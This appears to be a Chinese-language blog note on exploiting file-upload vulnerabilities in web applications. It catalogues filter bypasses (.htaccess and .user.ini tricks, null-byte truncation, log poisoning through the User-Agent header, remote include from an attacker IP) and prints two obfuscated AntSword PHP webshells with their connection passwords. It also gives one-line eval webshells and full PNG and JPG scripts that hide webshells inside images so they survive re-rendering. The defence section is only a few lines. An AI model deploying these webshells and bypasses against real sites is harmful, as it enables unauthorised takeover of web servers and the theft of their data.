title: 文件上传
author: liuGuobin
tags:
  - 日报
categories:
  - 日报
date: 2023-04-14 11:24:00
---
#### 分类
文件上传存在的漏洞一般有：

    类型限制绕过：Web应用程序对上传文件的类型进行限制，黑名单或白名单方式
                  攻击者可通过在请求包中伪造Content-Type字段或使用特定的文件扩展名的方式绕过限制，上传恶意文件。

    文件名欺骗：攻击者通过修改上传文件的文件名，绕过文件类型检测，从而上传恶意文件。

    目录遍历：攻击者通过在上传文件的路径中使用../等符号，绕过应用程序的安全限制，成功上传文件到其他目录。

    权限提升：攻击者上传恶意文件，通过漏洞提升权限，获取更高的系统权限。

    二进制文件上传：攻击者上传二进制文件到服务器，通过漏洞执行恶意代码。

#### 危害
操作木马文件提权 获取网站权限

#### 思路
burp抓包勤快点，多上传马，慢慢测试过滤规则，多积累木马。

#### 漏洞利用
【绕过前端检测】
1. 禁用JS
2. 更改前端文件
3. 更改文件后缀

【后端校验文件类型】
将Content-Type内容修改成image/png

【后端检测文件后缀 · 黑名单】
```
上传.user.ini        // auto_prepend_file = 1.jpg
或者.htaccess        // AddType application/x-httpd-php .jpg
上传木马并更改为合法后缀和文件类型
```

【文件内容过滤】
```
先使用二分法确定过滤了什么东西
1. 后缀名不完整 .php5 .phtml等绕过
2. 在数据包中文件后缀名前加空格
3. 使用phP绕过对php的检测
4. 上传.htacess文件
5. 末尾加上::$DATA
6. 双写pphphp绕过
7. 末尾加空格绕过
8. 0x00截断上传
9. 末尾加.绕过
10. %00截断上传
11. 后缀名前加.
12. MINE绕过
<? echo '123';?>                               //short_open_tags=on
<?=(表达式)?>  等价于 <?php echo (表达式)?>    //无限制
<% echo '123';%>                               //asp_tags=on php_version < 7
<script language=”php”>echo '123'; </script>   //php_vsesion < 7
可以用{}代替[]
过滤了()，那就用反引号'
对log过滤了使用lo"."g绕过
```

【未循环验证】
可以使用x.php..类似的方法

【UA注入日志包含】
```
上传完.user.ini        // auto_append_file="1.png"
再上传图片             // <?=include"/var/log/nginx/access.log"?>
访问网站然后修改ua头信息
```

【文件头检测】
```
增加对应的文件头
GIF文件:  GIF89A
PNG文件:  89 50 4E 47 0D 0A 1A 0A
```

【远程包含文件】
```
使用  https://www.bejson.com/convert/ip2int/  将IP转换为纯数字
<?=include'http://IP转换/'>
```

【条件竞争】
session包含，前文已经详细写过，不再重复描述。

【图片二次渲染】
将木马插入到图片中，类似于图片马
脚本放在文末

【getimagesize 绕过】
getimagesize() 获取上传文件信息，图片马绕过

【exif_imagetype 绕过】
getimagesize() 获取上传文件信息，图片马绕过

【文件大小检测】
拒绝传入太小或太大的文件，控制文件大小，建议使用图片马

【Apache陌生后缀解析漏洞】
Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名，也可以拥有多个扩展名。
Apache认为应该从右到左开始判断解析方法的。
如果最右侧的扩展名为不可识别的，就继续往左判断，直到判断到文件名为止。

#### 防护方案
1. 后端验证：采用服务端验证模式
2. 后缀验证：基于白名单，黑名单过滤
3. MIME验证：基于上传自带类型艰检测
4. 内容检测：文件头，完整性检测
5. 自带函数过滤
6. WAF防护软件：宝塔、云盾等


蚁剑生成的shell脚本
```
      // 连接密码: 123
<?php $qdjZ=create_function(chr(0x1cf-0x1ab).str_rot13('f').chr(0x15009/0x307).chr(228-119).str_rot13('r'),base64_decode('ZQ==').chr(104076/882).str_rot13('n').chr(651-543).chr(01545-01475).base64_decode('JA==').chr(90045/783).chr(0xca0e/0x1d2).str_rot13('z').chr(810-709).str_rot13(')').chr(29028/492));$qdjZ(base64_decode('Njc5M'.'jMzO0'.'BldkF'.'sKCRf'.''.base64_decode('VQ==').base64_decode('RQ==').str_rot13('9').chr(0xbe50/0x244).chr(390-304).''.''.str_rot13('S').chr(0157503/0761).str_rot13('k').base64_decode('TQ==').chr(01077-0725).''.'NdKTs'.'yMDM3'.'Njk5O'.'w=='.''));?>
      // 连接密码: TyKPuntU
<?php $bFIY=create_function(chr(25380/705).chr(92115/801).base64_decode('bw==').base64_decode('bQ==').base64_decode('ZQ=='),chr(0x16964/0x394).chr(0x6f16/0xf1).base64_decode('YQ==').base64_decode('bA==').chr(060340/01154).chr(01041-0775).base64_decode('cw==').str_rot13('b').chr(01504-01327).base64_decode('ZQ==').chr(057176/01116).chr(0xe3b4/0x3dc));$bFIY(base64_decode('NjgxO'.'Tc7QG'.'V2QWw'.'oJF9Q'.''.str_rot13('G').str_rot13('1').str_rot13('A').base64_decode('VQ==').str_rot13('J').''.''.chr(0x304-0x2d3).base64_decode('Ug==').chr(13197/249).str_rot13('F').base64_decode('MQ==').''.'B1bnR'.'VXSk7'.'MjA0N'.'TkxOw'.'=='.''));?>
```

PNG二次渲染脚本
```
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);


$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'1.png');  //要修改的图片的路径

/*木马内容   <?$_GET[0]($_POST[1]);?>   */

?>
建议使用已经渲染过一次的文件写入木马，防止文件改动过大。
```

JPG二次渲染脚本
```

<?php
    $miniPayload = "<?=eval(\$_POST[1]);?>";

    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }
    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }
    set_error_handler("custom_error_handler");
    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }
        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }

        public function seek() {
            return ($this->size - strlen($this->binData));
        }

        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }

        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
```